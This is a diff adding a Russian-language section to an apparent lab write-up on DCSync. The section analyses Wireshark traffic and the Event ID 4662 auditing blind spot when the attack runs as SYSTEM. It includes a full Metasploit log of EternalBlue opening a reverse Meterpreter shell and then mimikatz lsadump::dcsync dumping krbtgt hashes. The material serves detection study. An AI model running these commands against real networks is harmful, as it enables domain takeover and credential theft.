@@ -169,6 +169,138 @@ UUID интерфейса;
 Обычные доменные пользователи такими правами не обладают, поэтому контроллер домена отклоняет запрос на получение репликационных данных.
 Из-за использования уровня аутентификации RPC Packet Privacy код ошибки внутри ответа зашифрован и не отображается в Wireshark, однако характер сетевого обмена однозначно показывает, что репликация не была выполнена.
 
+
+## Разбор трафика в Wireshark (по файлу DCSync/triage/wireshark/dcsync_rpc_success.pcapng)
+<img width="1917" height="970" alt="image" src="https://github.com/user-attachments/assets/2d263c6e-06d1-484f-bb14-4cb0d668f975" />
+
+
+Файл был получен используя утилиту mimikatz (lsadump::dcsync) под УЗ system. 
+
+#### 1. Особенности диссекции трафика в Wireshark
+
+В захваченном трафике Wireshark не отображает интерфейс DRSUAPI, хотя вызовы репликационных методов действительно происходят. Это связано с тем, что:
+* Wireshark определяет интерфейс RPC по UUID, переданному в bind‑пакете.
+* При выполнении атаки из контекста SYSTEM (особенно после эксплуатации MS017 или аналогичных уязвимостей) часть RPC‑трафика может быть сформирована без корректного указания интерфейсного UUID или с минимальным набором RPC‑метаданных.
+* В результате Wireshark не может сопоставить вызовы с интерфейсом drsuapi, но opnum остаются корректными, что позволяет вручную определить вызываемые методы.
+Несмотря на отсутствие автоматической диссекции, принадлежность трафика к протоколу репликации Active Directory однозначно идентифицируется путем анализа поля Opnum (номер операции) в заголовках пакетов DCE/RPC. Значения Opnum строго регламентированы спецификацией [Microsoft MS-DRSR](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-drsr/58f33216-d9f1-43bf-a183-87e3c899c410?spm=a2ty_o01.29997173.0.0.33c455fbhHJV9b) и позволяют реконструировать последовательность вызовов методов.
+
+#### 2) Отсутствие события Event ID 4662 при выполнении из-под SYSTEM
+
+Важной особенностью данной техники является отсутствие события Event ID 4662 (An operation was performed on an object) в журнале Windows Security при успешном выполнении DCSync из контекста SYSTEM.
+Генерация события 4662 при вызове функции` IDL_DRSGetNCChanges` напрямую зависит от конфигурации `SACL (System Access Control List)` объекта `Directory Service` (в частности, корневого объекта домена domainDNS). Если в `SACL` данного объекта не настроен аудит прав категории `"Control Access"` (в частности, прав `Replicating Directory Changes`) для учетной записи SYSTEM или групп, в которые она входит, попытка репликации не будет залогирована. Это демонстрирует потенциальную "слепую зону" (blind spot) в настройках аудита безопасности по умолчанию, которой могут воспользоваться злоумышленники, повысившие привилегии SYSTEM на контроллере домена. (Под УЗ админа событие 4662 фиксируется)
+
+> Справка: SACL (System Access Control List) — системный список управления доступом, являющийся частью дескриптора безопасности защищаемого объекта в Windows. В отличие от DACL (который разрешает или запрещает доступ), SACL определяет, какие типы попыток доступа со стороны конкретных субъектов (пользователей, групп или процессов) должны инициировать создание записи аудита в журнале событий безопасности. Настроить SACL для объектов AD можно через оснастку Active Directory Users and Computers (вкладка Security -> Advanced -> вкладка Auditing).
+
+
+### Пример команды: kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC02.work.local exit"
+Результат выполнения команды:
+
+```python
+msf6 exploit(windows/smb/ms17_010_eternalblue) > run
+[*] Started reverse TCP handler on 192.168.0.30:4444 
+[*] 192.168.0.10:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
+[+] 192.168.0.10:445      - Host is likely VULNERABLE to MS17-010! - Windows Server 2012 R2 Standard 9600 x64 (64-bit)
+[*] 192.168.0.10:445      - Scanned 1 of 1 hosts (100% complete)
+[+] 192.168.0.10:445 - The target is vulnerable.
+[*] 192.168.0.10:445 - shellcode size: 1283
+[*] 192.168.0.10:445 - numGroomConn: 12
+[*] 192.168.0.10:445 - Target OS: Windows Server 2012 R2 Standard 9600
+[+] 192.168.0.10:445 - got good NT Trans response
+[+] 192.168.0.10:445 - got good NT Trans response
+[+] 192.168.0.10:445 - SMB1 session setup allocate nonpaged pool success
+[+] 192.168.0.10:445 - SMB1 session setup allocate nonpaged pool success
+[+] 192.168.0.10:445 - good response status for nx: INVALID_PARAMETER
+[+] 192.168.0.10:445 - good response status for nx: INVALID_PARAMETER
+[*] Sending stage (203846 bytes) to 192.168.0.10
+[*] Meterpreter session 3 opened (192.168.0.30:4444 -> 192.168.0.10:58068) at 2026-07-28 09:19:15 -0500
+
+meterpreter > load kiwi
+Loading extension kiwi...
+  .#####.   mimikatz 2.2.0 20191125 (x64/windows)
+ .## ^ ##.  "A La Vie, A L'Amour" - (oe.eo)
+ ## / \ ##  /*** Benjamin DELPY `gentilkiwi` ( benjamin@gentilkiwi.com )
+ ## \ / ##       > http://blog.gentilkiwi.com/mimikatz
+ '## v ##'        Vincent LE TOUX            ( vincent.letoux@gmail.com )
+  '#####'         > http://pingcastle.com / http://mysmartlogon.com  ***/
+
+Success.
+meterpreter > kiwi_cmd "lsadump::dcsync /domain:work.local /user:krbtgt /dc:DC02.work.local exit"
+[DC] 'work.local' will be the domain
+[DC] 'DC02.work.local' will be the DC server
+[DC] 'krbtgt' will be the user account
+[rpc] Service  : ldap
+[rpc] AuthnSvc : GSS_NEGOTIATE (9)
+
+Object RDN           : krbtgt
+
+** SAM ACCOUNT **
+
+SAM Username         : krbtgt
+Account Type         : 30000000 ( USER_OBJECT )
+User Account Control : 00000202 ( ACCOUNTDISABLE NORMAL_ACCOUNT )
+Account expiration   : 
+Password last change : 19.04.2026 1:16:40
+Object Security ID   : S-1-5-21-2790878447-3455683389-983535108-502
+Object Relative ID   : 502
+
+Credentials:
+  Hash NTLM: b8bcdec75f939ce1637ad4fd2c1a364e
+    ntlm- 0: b8bcdec75f939ce1637ad4fd2c1a364e
+    lm  - 0: 86a90ac8229c789cfb58fa85e55f2b51
+
+Supplemental Credentials:
+* Primary:Kerberos-Newer-Keys *
+    Default Salt : WORK.LOCALkrbtgt
+    Default Iterations : 4096
+    Credentials
+      aes256_hmac       (4096) : b2f8e371e4e8e76f29efc5d1ebef2e357803f30a99548fa0eaf35120ef17da78
+      aes128_hmac       (4096) : 484717f9845720c5b22c0d95343d2f9e
+      des_cbc_md5       (4096) : f7d00dc1b9f4a219
+
+* Primary:Kerberos *
+    Default Salt : WORK.LOCALkrbtgt
+    Credentials
+      des_cbc_md5       : f7d00dc1b9f4a219
+
+* Packages *
+    Kerberos-Newer-Keys
+
+* Primary:WDigest *
+    01  97505112dac0f7ea2d161a36e938b251
+    02  f22f9cebc95c9d6a57bfbdc6d680e324
+    03  b5cf5566a19b471f12b8c84bf41db6bb
+    04  97505112dac0f7ea2d161a36e938b251
+    05  f22f9cebc95c9d6a57bfbdc6d680e324
+    06  1aa1abbdb4abac01758234122aad0597
+    07  97505112dac0f7ea2d161a36e938b251
+    08  b7cdfe59dd122101ce12ab1ebc813b32
+    09  b7cdfe59dd122101ce12ab1ebc813b32
+    10  616370e2e2835a131d48178c02267ac2
+    11  53a546018f1d2dcb988dbef0d6d276fd
+    12  b7cdfe59dd122101ce12ab1ebc813b32
+    13  3d44643426b80a6716638ff9e933fc16
+    14  53a546018f1d2dcb988dbef0d6d276fd
+    15  748d6cf005fb378f8f02976c2c8e8984
+    16  748d6cf005fb378f8f02976c2c8e8984
+    17  94aa3bfdd205682f7a823131584e8e7d
+    18  fb759f2be20f57a5d35eac9feeb5a1fc
+    19  314a7394d9fc71e6c65386ba7d3160e8
+    20  0694979b3a0620092d137f02a34ac3af
+    21  023107488ca3d013032e97d273a84c7d
+    22  023107488ca3d013032e97d273a84c7d
+    23  4373bc29c40a6e5cd4b0e98f38c0dadf
+    24  6a12f2092a8cb873eecdd3998cf789d5
+    25  6a12f2092a8cb873eecdd3998cf789d5
+    26  00143ff5c68a35aee4b810bcbb0d4387
+    27  96136da343cf0a9fe908bbb056e6cbb0
+    28  7bfcfc00cd1a0098bfab06827d204d73
+    29  73eb33bba004514e521f69c770d6c66b
+
+meterpreter > getuid
+Server username: NT AUTHORITY\СИСТЕМА
+meterpreter > 
+```
+
 ---
 
 ## Описание к модулю Mimikatz lsadump::dcsync (...\mimikatz-2.2.0-20220919\mimikatz-2.2.0-20220919\mimikatz\modules\lsadump)
